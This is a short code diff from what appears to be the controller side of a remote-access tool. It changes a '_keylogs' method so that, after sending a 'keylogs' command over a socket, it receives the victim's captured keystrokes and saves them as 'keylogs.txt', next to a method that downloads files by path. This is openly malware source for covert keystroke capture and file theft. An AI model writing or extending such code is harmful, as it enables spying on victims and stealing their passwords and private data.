@@ -90,7 +90,8 @@ class Client:
 
     def _keylogs(self) -> None:
         self._send("keylogs")
-        print("keylogs executed")
+        file_size = self._sock.recv(1024).decode("utf-8")
+        self._recieve_file(int(file_size), file_name=f"keylogs.txt")
 
     def _download(self, file_path: str) -> None:
         self._send("download", file_path)
